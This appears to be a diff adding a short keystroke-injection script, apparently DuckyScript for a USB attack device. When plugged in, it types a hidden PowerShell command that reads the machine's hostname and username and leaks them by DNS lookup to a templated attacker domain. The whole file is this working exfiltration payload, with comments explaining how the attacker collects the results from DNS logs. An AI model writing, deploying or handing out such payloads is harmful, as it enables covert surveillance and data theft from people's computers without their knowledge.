@@ -1,0 +1,5 @@
+REM silent DNS exfil of hostname + username -> <hostname>.<user>.{{ATTACKER_DOMAIN}}
+REM Query your DNS logs for the subdomain - no inbound connection needed
+REM Tokens: {{ATTACKER_DOMAIN}}
+STRING powershell -NoProfile -WindowStyle Hidden -Command "$h=$env:COMPUTERNAME;$u=$env:USERNAME;Resolve-DnsName (\"$h.$u.{{ATTACKER_DOMAIN}}\")"
+ENTER
